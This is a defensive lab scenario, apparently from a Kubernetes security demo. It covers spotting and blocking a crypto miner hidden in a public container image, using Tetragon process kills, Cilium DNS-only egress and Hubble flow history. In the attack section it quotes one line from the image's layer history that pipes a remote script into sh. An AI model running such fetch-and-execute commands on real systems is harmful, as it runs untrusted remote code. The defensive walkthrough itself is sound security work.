# Scenario 10 — Analyzing a crypto miner container

**Coverage:** 🛑 Block · 🔍 Identify · Control: **Tetragon kill + Cilium DNS/egress lock**
**Target:** `batch-check-job` (Kubernetes Job) in `default` namespace

## The attack
A public image runs a hidden crypto miner. The layer history reveals a payload
that curls a remote script and executes it:

```bash
kubectl get jobs
kubectl describe job batch-check-job
docker history --no-trunc madhuakula/k8s-goat-batch-check
# a layer writes: curl -sSL https://madhuakula.com/.../k8s-goat-... | sh
```

## Identify — two signals
**Runtime (Tetragon):** the miner/payload process exec and its outbound
connections:

```bash
kubectl -n kube-system exec ds/tetragon -c tetragon -- tetra getevents -o compact --pods batch-check
# ⚡ process_exec /system-startup ...   + connect() to an external host
```

**Network (Hubble):** a beacon pattern — repeated outbound to the same
destination on a timer. With **Enterprise Timescape** you can query this history
*after* the short-lived Job has been deleted.

```bash
hubble observe --from-label job-name=batch-check-job --follow
```

## Block — starve it and kill it
```bash
kubectl apply -f policies/network/10-cryptominer-egress.yaml   # DNS-only egress, no pools reachable
kubectl apply -f policies/tetragon/10-cryptominer-exec.yaml     # Sigkill the miner/payload binary
```
The network policy denies all egress except DNS, so the payload fetch and pool
connections drop; Tetragon Sigkills the payload wrapper on exec. Belt and braces.

## Talk track
> "Cryptojacking needs two things: run its binary and reach a pool. Tetragon
> kills the process on exec; Cilium default-deny egress means even if it ran, it
> can't reach a pool or pull its payload. And with Timescape you can prove, days
> later, exactly what that deleted Job phoned out to."

## Limitations / honesty
Image scanning / provenance (signed images, admission) should stop the bad image
landing at all. Isovalent is the runtime + egress containment when a poisoned
image runs anyway.
